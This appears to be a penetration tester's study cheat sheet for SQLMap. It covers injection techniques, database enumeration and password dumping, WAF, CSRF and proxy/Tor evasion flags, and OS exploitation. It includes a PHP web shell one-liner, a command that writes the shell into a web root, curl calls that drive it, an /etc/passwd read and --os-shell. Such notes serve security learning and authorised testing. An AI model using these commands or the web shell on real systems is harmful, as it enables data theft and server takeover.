# SQLMap 
Penetration testing tool to detect and exploit SQL injection vulnerabilities

---

## Types of Injection Vulnerabilities 
The default SQL injection techniques used are described by the acronym BEUSTQ
- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

---
## Basic Usage
```shell
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

Use the `copy as cURL` right click option from the networking tab in inspector and replace with sqlmap
```shell
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

POST data can be added with the `--data` flag and `--method POST`

Alternatively, you can capture a request using [[BurpSuite]] and copy into a file which can be read with the `-r` flag

Use the `--cookie` flag to set the session cookie 
```shell
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```
Or with a `-h` header option
```shell
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

`--mobile` and `--random-agent` can be used to change the agent header

Specify the injection mark with a `*` Ex: 
>--cookie="id=1*"

SQLMap also supports JSON formatted (e.g. `{"id":1}`) and XML formatted (e.g. `<element><id>1</id></element>`) HTTP requests.

`-t` flag will dump all the traffic data from the request and response to designated file

`--proxy` can be used to analyze traffic with [[BurpSuite]]

---
## Attack Tuning
Every payload sent to the target consists of:

-   vector (e.g., `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.

-   boundaries (e.g. `'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.

### Prefix/Suffix
Some special prefix and suffix values may be required in rare cases 
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

### Level/Risk
When bigger sets of boundaries and vectors are required:

-   The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).

-   The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

### Additional Fine Tuning
`--code=200` will filter all 200 status codes returned by SQLi
`--titles` will detect a title changes in the `<title>` html tag
`--string=success` can be used to detect if a string is present in response
`--text-only` limits detection to only visible HTML content
`--technique=BEU` will limit SQLi payloads to these techniques
`--union-cols=17` or `--union-char='a'` can be used to specify vulnerable columns
`--union-from=users` can be used to specify appendix at the end of a UNION query
`-T tablename` can be used to specify which table data to dump

## DB Enumeration
`--banner` will use the VERSION() query
`--current-user` will use the CURRENT_USER() query
`--hostname` will diplay the hostname of the vulnerable target
`--current-db` will display the current database name
`--is-dba` will show if current user is a database admin
`--password-hashes` will dump only password hashes found in db

```shell
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

`--tables` will enumerate tables specified with `-D dbname`
`--dump` will display table data specified by `-T tablename` and columns by `-C a,b` 
and rows by `--start=2 --stop=3` and further specified by `--where="name LIKE 'f%'"`

`--dump-all` will dump all the content from all the databases
`--exclude-sysdbs` will exclude content from system databases

`--schema` will retrieve the structure of all the tables
`--search -T user` will try to find tables containing the string 'user' 
`--search -C pass` will try to find columns containing the string 'pass'
`--passwords` self explanatory

**`--all --batch` will do a complete enumeration**

## Bypassing Web Application Protections
### Anti-CSRF Token Bypass
```shell
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

### Unique Value Bypass
```shell
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp
```

### Calculated Parameter Bypass
```shell
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

### Proxies
`--proxy="socks4://177.39.187.70:33283"`
`--proxy-file`
By using switch `--tor`, there should be a `SOCKS4` proxy in port 9050 or 9150
Use `--check-tor` to test

User agent bypass `--random-agent`

### WAF/IPS Bypass
Tamper scripts are python scripts writeen for modifying reauests before being sent
They can be chained this way `--tamper=between,randomcase`
To get a whole list of tamper scripts run `--list-tampers`
`--chunked` can be used when SQL keywords are blacklisted

## OS Exploitation
SQLMap has the ability to read/write files on the target machine and allow for RCE

### File Read/Write
In MySql, to read local files, the DB user must have the privilege to `LOAD DATA` and `INSERT`, to be able to load the content of a file to a table and then reading that table.
-   `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`

`--is-dba` can be used to figure out if we have read/write privileges

To read files:
```shell
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

To write files:
```shell
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

The PHP shell file: 
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Sending commands to the cmd shell:
```shell
curl http://www.example.com/shell.php?cmd=ls+-la
```

## RCE
SQLMap can directly create an SQL shell using xp_cmdshell
```shell
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

If this returns NO OUTPUT, sometimes switching injection techniques may be required with `--technique=E`

